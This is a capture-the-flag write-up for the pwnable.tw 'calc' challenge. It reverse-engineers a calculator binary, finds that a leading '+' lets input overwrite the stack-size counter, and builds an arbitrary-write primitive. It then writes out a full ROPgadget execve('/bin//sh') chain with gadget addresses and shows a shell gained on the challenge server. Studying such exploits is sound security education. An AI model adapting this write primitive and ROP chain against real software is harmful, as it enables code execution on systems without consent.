# calc (pwn, pwnable.tw, stack machine)

Notes:
- binary given
- ASLR enabled

## Enumeration
In this task we are given a quite simple calculator program. We can perform 
`add`, `substract`, `mul`, `divide`, `modulo` operations. But we are unable to
do any equations with brackets (), or use '0'.

```bash
$ ./calc 
=== Welcome to SECPROG calculator ===
2+8
10
2/0
prevent division by zero
2+0
prevent division by zero
AAA2+AAA8
10
(2+2)*2     
6
```

Using Ghidra we can reconstruct some pseudocode. It is quite large, so let's do
it step by step.

```c
int main() {
    signal(0xe,timeout);
    alarm(0x3c);
    puts("=== Welcome to SECPROG calculator ===");
    fflush((FILE *)stdout);
    calc();
    puts("Merry Christmas!");
    return;
}
```

Oh, we do know this signal + alarm trap! It will exit a program after 60 seconds.
To make it easier to debug we can simply overwrite the alarm(0x3c) instruction with nops.

Besides signal there is nothing more intresting in `main`. Let's inspect `calc`:

```c
void calc(void)
{
  int iVar1;
  int iVar2;
  int in_GS_OFFSET;
  int calc_ram_size;
  int calc_ram [100];
  char expr_buf [1024];
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14); // canary
  while( true ) {
    bzero(expr_buf,0x400);
    iVar2 = get_expr(expr_buf,0x400);
    if (iVar2 == 0) break;
    init_pool(&calc_ram_size);
    iVar2 = parse_expr(expr_buf,&calc_ram_size);
    if (iVar2 != 0) {
      printf("%d\n",calc_ram[calc_ram_size + -1]);
      fflush((FILE *)stdout);
    }
  }
  if (iVar1 == *(int *)(in_GS_OFFSET + 0x14)) { // canary
    return;
  }
  __stack_chk_fail();
}
```

So this part confused me for a while. Program in loop:
1. erases data in expr_buf,
2. reads user input and stores it into expr_buf,
3. calls init_pool on calc_ram_size?
4. parses_expr providing only calc_ram_size?

Wait, it looks like Ghidra messed something up! The program doesn't seem to 
use calc_ram array at all! Let's check `intit_pool` function:

```c
void init_pool(int *param_1)
{
  int local_8;
  
  *param_1 = 0;
  local_8 = 0;
  while (local_8 < 100) {
    param_1[local_8 + 1] = 0;
    local_8 = local_8 + 1;
  }
  return;
}
```

Ha, everything is clear now! We simply have:

```c
void calc(void)
{
  int iVar1;
  int iVar2;
  int in_GS_OFFSET;
  int calc_ram[101]; // calc_ram[0] stores actual size of calc_ram
  char expr_buf [1024];
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14); // canary
  while( true ) {
    bzero(expr_buf,0x400);
    iVar2 = get_expr(expr_buf,0x400);
    if (iVar2 == 0) break;
    init_pool(&calc_ram);
    iVar2 = parse_expr(expr_buf,&calc_ram);
    if (iVar2 != 0) {
      printf("%d\n",calc_ram[calc_ram[0]]);
      fflush((FILE *)stdout);
    }
  }
  if (iVar1 == *(int *)(in_GS_OFFSET + 0x14)) { // canary
    return;
  }
  __stack_chk_fail();
}
```

Let's check if we can find anything buggy inside `get_expr`.

```c
int get_expr(char *expr_buf,int max_expr_len)

{
  ssize_t bytes_read;
  char char_read;
  int idx;
  
  idx = 0;
  while (idx < max_expr_len) {
    bytes_read = read(0,&char_read,1);
    if ((bytes_read == -1) || (char_read == '\n')) break;
    if ((((char_read == '+') || (((char_read == '-' || (char_read == '*')) || (char_read == '/'))))
        || (char_read == '%')) || (('/' < char_read && (char_read < ':')))) {
      expr_buf[idx] = char_read;
      idx = idx + 1;
    }
  }
  expr_buf[idx] = '\0';
  return idx;
}
```

Unfortunately for us everything seems legit. Program reads user input but loads only:
`'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '-', '/', '%', '*'` characters. At this point I checked the file protections in order to see what we have to look for:

```bash
$ checksec ./calc
[*] './calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Well, looks like there is no point in looking for traditional buffer overflow as we have canaries enabled.

Ok, so if there is anything vulnerable it must be inside `parse_expr` function as till now we havn't found anything to start messing with. This is what Ghidra has produced (I've added variable types + names)

```c
int parse_expr(char *expr_buf,int *calc_ram)

{
  char *number_buf;
  int tmp;
  int result;
  size_t str_number_len;
  int in_GS_OFFSET;
  char *expr_buf_ptr;
  int expr_buf_idx;
  int operands_idx;
  char operands [100];
  int local_10;
  int iVar1;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  expr_buf_ptr = expr_buf;
  operands_idx = 0;
  bzero(operands,100);
  expr_buf_idx = 0;
  do {
    if (9 < (int)expr_buf[expr_buf_idx] - 0x30U) {
      str_number_len = (size_t)(expr_buf + (expr_buf_idx - (int)expr_buf_ptr));
      number_buf = (char *)malloc(str_number_len + 1);
      memcpy(number_buf,expr_buf_ptr,str_number_len);
      number_buf[str_number_len] = '\0';
      tmp = strcmp(number_buf,"0");
      if (tmp == 0) {
        puts("prevent division by zero");
        fflush((FILE *)stdout);
        result = 0;
        goto LAB_0804935f;
      }
      result = atoi(number_buf);
      if (0 < result) {
        iVar1 = *calc_ram;
        *calc_ram = iVar1 + 1;
        calc_ram[iVar1 + 1] = result;
      }
      if ((expr_buf[expr_buf_idx] != '\0') && (9 < (int)expr_buf[expr_buf_idx + 1] - 0x30U)) {
        puts("expression error!");
        fflush((FILE *)stdout);
        result = 0;
        goto LAB_0804935f;
      }
      expr_buf_ptr = expr_buf + expr_buf_idx + 1;
      if (operands[operands_idx] == '\0') {
        operands[operands_idx] = expr_buf[expr_buf_idx];
      }
      else {
        switch(expr_buf[expr_buf_idx]) {
        case '%':
        case '*':
        case '/':
          if ((operands[operands_idx] == '+') || (operands[operands_idx] == '-')) {
            operands[operands_idx + 1] = expr_buf[expr_buf_idx];
            operands_idx = operands_idx + 1;
          }
          else {
            eval(calc_ram,operands[operands_idx]);
            operands[operands_idx] = expr_buf[expr_buf_idx];
          }
          break;
        default:
          eval(calc_ram,operands[operands_idx]);
          operands_idx = operands_idx + -1;
          break;
        case '+':
        case '-':
          eval(calc_ram,operands[operands_idx]);
          operands[operands_idx] = expr_buf[expr_buf_idx];
        }
      }
      if (expr_buf[expr_buf_idx] == '\0') {
        while (-1 < operands_idx) {
          eval(calc_ram,operands[operands_idx]);
          operands_idx = operands_idx + -1;
        }
        result = 1;
LAB_0804935f:
        if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
        return result;
      }
    }
    expr_buf_idx = expr_buf_idx + 1;
  } while( true );
}
```

Aweful! Let's create some pseudocode we can actually look at. Note that the program acts the same for '+', '-' and the same for '*', '%', '/' so we can just leave '+' and '*'.

```c
// pseudocode
void parse_expr(char *expr_buf,int *calc_ram) {
    char operands [100];
    size_t operands_idx = 0;
    int expr_buf_idx = 0;
    int old_expr_buf_idx = 0;

    while (true) {
        char c = expr_buf[expr_buf_idx];
        // if we found operand or end of expr
        if (!is_digit(c)) {
            // then a number must have been before
            size_t str_number_len = expr_buf_idx - old_expr_buf_idx;
            // read this number. I've simplified this as there was no vuln in malloc + atoi
            int num = (int) strtol(&expr_buf[old_expr_buf_idx], &expr_buf[expr_buf_idx], 10);
            // don't accept any zeros. Not only in division
            if (num == 0) {
                puts("prevent division by zero");
                return;
            }
            // store the number in calc_ram
            calc_ram[0] += 1;
            calc_ram[calc_ram[0]] = num;
            old_expr_buf_idx = expr_buf_idx + 1;

            if (operands[operands_idx] == '\0') {
                operands[operands_idx] = c;
            } 
            else {
                switch (c) {
                    case '*':
                        if (operands[operands_idx] == '+') {
                            operands[operands_idx + 1] = c;
                            operands_idx += 1;
                        } else {
                            eval(calc_ram,operands[operands_idx]);
                            operands[operands_idx] = c;
                        }
                        break;

                    case '+':
                        eval(calc_ram,operands[operands_idx]);
                        operands[operands_idx] = c;
                        break;

                    case '\0':
                        eval(calc_ram,operands[operands_idx]);
                        operands_idx -= 1;
                        break;
                }
        }

        if (c == '\0') {
            while (-1 < operands_idx) {
                eval(calc_ram,operands[operands_idx]);
                operands_idx -= 1;
            }
            return;
        }

        expr_buf_idx++;
    }
}
```

Much better although still quite complicated. This is good as there must be a waiting to be exploited there!

Last function we need to reconstruct is `eval`:

```c
// simplified to '+' and '*'
void eval(int *calc_ram,char operand)
{
  size_t calc_ram_size = calc_ram[0];
  if (operand == '+') {
    calc_ram[calc_ram_size - 1] += calc_ram[calc_ram_size];
    calc_ram[0] -= 1;
  } 
  else if (operand == '*') {
    calc_ram[calc_ram_size - 1] *= calc_ram[calc_ram_size];
    calc_ram[0] -= 1;
  }
  return;
}
```

This is very popular approach to evaluate arithmetic operations. It is called <b>Reverse Polish notation</b>.
Let's see the example. We want to calculate 8+7:


To read: 8+7

|calc ram|
| :-----:|
|    .   |
|    .   |
|    .   |
|    .   |
|   0    |

|operands|
| :-----:|
|    .   |
|    .   |


To read: +7

|calc ram|
| :-----:|
|    .   |
|    .   |
|    .   |
|   8    |
|   1    |

|operands|
| :-----:|
|    .   |
|   +    |


To read: 7

|calc ram|
| :-----:|
|    .   |
|    .   |
|    .   |
|   8    |
|   1    |

|operands|
| :-----:|
|    .   |
|   +    |


To read: '/0'

|calc ram|
| :-----:|
|    .   |
|    .   |
|    .   |
|   15   |
|    1   |

|operands|
| :-----:|
|    .   |
|    .   |

## Exploit
It took me ages to find a starting point. I've spend ages trying to perform buffer overflow by combining addition with multiplication:
`1+1*1+1*1+1*1...`

It would overflow both operations and ram_calc buffers.

```bash
$ python -c "print '1+1*' * 100 + '1'" | ./calc
=== Welcome to SECPROG calculator ===
*** stack smashing detected ***: ./calc terminated
Aborted
```

But as mentioned at the begining stack canaries are enabled and so I had to come up with something smarter.

And then it hit me! Instead of overflowing the buffer in standard way, we can gain control over <b>calc_ram_size</b>. How? Look at what happens when we provide +300 as input.

Program starts with reading '+' sign and will place it in operands array:

|calc ram|
| :-----:|
|    .   |
|    .   |
|    .   |
|   0    |

|operands|
| :-----:|
|    .   |
|   +    |

Then it will read '3', '0' and '0' performing no action other than increasing expr_buf_idx. Finally program will read '\0' and will firstly load 300 inside calc_ram:

```c
[...]
// store the number in calc_ram
calc_ram[0] += 1;
calc_ram[calc_ram[0]] = num;
old_expr_buf_idx = expr_buf_idx + 1;
[...]
```

|calc ram|
| :-----:|
|    .   |
|    .   |
|  300   |
|  1     |

|operands|
| :-----:|
|    .   |
|   +    |

and then will get inside '/0' case:

```c
[...]
switch (c) {
    case '\0':
        eval(calc_ram,operands[operands_idx]);
        operands_idx -= 1;
        break;
}
```

Where the most important from attacker perspective operation will happen.

```c
size_t calc_ram_size = calc_ram[0];
if (operand == '+') {
    calc_ram[calc_ram_size - 1] += calc_ram[calc_ram_size];
    calc_ram[0] -= 1;
} 
[...]
```

Can you spot what is happening? The developer didn't thought about case when user would pass '+' as first sign of expression. The eval function expects at least two numbers on calc_ram stack. There is only one number and we will leave eval in such state:

|calc ram|
| :-----:|
|    .   |
|    .   |
|  300   |
|  300   |

|operands|
| :-----:|
|    .   |
|   +    |

and the next instruction in case will erase operands array. In the end we will be left with:

|calc ram|
| :-----:|
|    .   |
|    .   |
|  300   |
|  300   |

|operands|
| :-----:|
|    .   |
|    .   |

Ha, that's amazing! Why? Well, we can extend our expression:
+300+800

Reading 800 will result in overwriting an address at offset 301 in calc_ram when placing num in calc_ram.

(again)
```c
[...]
// store the number in calc_ram
calc_ram[0] += 1;
calc_ram[calc_ram[0]] = num;
old_expr_buf_idx = expr_buf_idx + 1;
[...]
```

|calc ram|
| :-----:|
|  800   |
|  [...] |
|  300   |
|  301   |

|operands|
| :-----:|
|    .   |
|    .   |


Well, that's all we need. We just learned how to overwrite an address with a value of our choice!

```python
def i2b(i):
    return str(i).encode('utf-8')


def overwrite_addr_at_offset(offset, value):
    '''Overwrite addr at offset from calc_ram.
    Warning: it will mess the value at addr-1. If you need to overwrite
    multiple addresses then start from the biggest one.'''
    payload = b'+' + i2b(int((offset / 4) - 1)) + b'+' + i2b(value)
    p.sendline(payload)
    p.recvline()
```

So we can create a ROP in order to gain shell. I've used ROPgadget with --ropchain option this time and it worker great!

```bash
$ ROPgadget --binary calc --ropchain
- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec060) # @ .data
	p += pack('<I', 0x0805c34b) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec064) # @ .data + 4
	p += pack('<I', 0x0805c34b) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec068) # @ .data + 8
	p += pack('<I', 0x080550d0) # xor eax, eax ; ret
	p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481d1) # pop ebx ; ret
	p += pack('<I', 0x080ec060) # @ .data
	p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080ec068) # @ .data + 8
	p += pack('<I', 0x080ec060) # padding without overwrite ebx
	p += pack('<I', 0x080701aa) # pop edx ; ret
	p += pack('<I', 0x080ec068) # @ .data + 8
	p += pack('<I', 0x080550d0) # xor eax, eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x0807cb7f) # inc eax ; ret
	p += pack('<I', 0x08049a21) # int 0x80
```

I strongly recomend it. I just had to reverse the order (see Warning in overwrite_addr_at_offset function description):

```python
# ROP, generated using ROPgadget --binary calc --ropchain 
overwrite_addr_at_offset(RA_OFFSET + 4 * 33, 0x08049a21) # int 0x80
overwrite_addr_at_offset(RA_OFFSET + 4 * 32, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 31, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 30, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 29, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 28, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 27, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 26, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 25, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 24, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 23, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 22, 0x0807cb7f) # inc eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 21, 0x080550d0) # xor eax, eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 20, 0x080ec068) # @ .data + 8
overwrite_addr_at_offset(RA_OFFSET + 4 * 19, 0x080701aa) # pop edx ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 18, 0x080ec060) # padding without overwrite ebx
overwrite_addr_at_offset(RA_OFFSET + 4 * 17, 0x080ec068) # @ .data + 8
overwrite_addr_at_offset(RA_OFFSET + 4 * 16, 0x080701d1) # pop ecx ; pop ebx ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 15, 0x080ec060) # @ .data
overwrite_addr_at_offset(RA_OFFSET + 4 * 14, 0x080481d1) # pop ebx ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 13, 0x0809b30d) # mov dword ptr [edx], eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 12, 0x080550d0) # xor eax, eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 11, 0x080ec068) # @ .data + 8
overwrite_addr_at_offset(RA_OFFSET + 4 * 10, 0x080701aa) # pop edx ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 9, 0x0809b30d) # mov dword ptr [edx], eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 8, 0x68732f2f) # //sh
overwrite_addr_at_offset(RA_OFFSET + 4 * 7, 0x0805c34b) # pop eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 6, 0x080ec064) # @ .data + 4
overwrite_addr_at_offset(RA_OFFSET + 4 * 5, 0x080701aa) # pop edx ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 4, 0x0809b30d) # mov dword ptr [edx], eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 3, 0x6e69622f) # /bin
overwrite_addr_at_offset(RA_OFFSET + 4 * 2, 0x0805c34b) # pop eax ; ret
overwrite_addr_at_offset(RA_OFFSET + 4 * 1, 0x080ec060) # @ .data
overwrite_addr_at_offset(RA_OFFSET + 4 * 0, 0x080701aa) # pop edx ; ret
```

And that's all. Let's execute our [exploit](exp.py):

```bash
$ python3 exp.py
[+] Opening connection to chall.pwnable.tw on port 10100: Done
[*] Switching to interactive mode
$ id
uid=1000(calc) gid=1000(calc) groups=1000(calc)
$ 
```